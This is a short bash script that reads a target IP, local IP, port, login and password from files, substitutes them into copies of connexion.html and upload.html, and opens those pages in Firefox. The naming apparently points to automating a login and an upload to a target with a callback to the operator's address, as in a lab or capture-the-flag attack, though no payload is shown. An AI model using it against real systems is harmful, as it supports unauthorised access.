#!/bin/bash
path=$(cat path)
cd $path
echo $path
IP_address=$(cat IP_address)
IP_local=$(cat IP_local)
port=$(cat port)
mdp=$(cat mdp.txt)
login=$(cat login.txt)
cd ..
cp connexion.html connexionmod.html
cp upload.html uploadmod.html

sed -i "s/{{PORT}}/$(echo $port)/g" uploadmod.html
sed -i "s/{{IP}}/$(echo $IP_local)/g" uploadmod.html
sed -i "s/{{IP_TARGET}}/$(echo $IP_address)/g" uploadmod.html
sed -i "s/{{IP_TARGET}}/$(echo $IP_address)/g" connexionmod.html
sed -i "s/{{LOGIN}}/$(echo $login)/g" connexionmod.html
sed -i "s/{{MDP}}/$(echo $mdp)/g" connexionmod.html

firefox connexionmod.html &
sleep 4
firefox uploadmod.html &
sleep 4
firefox uploadmod.html &
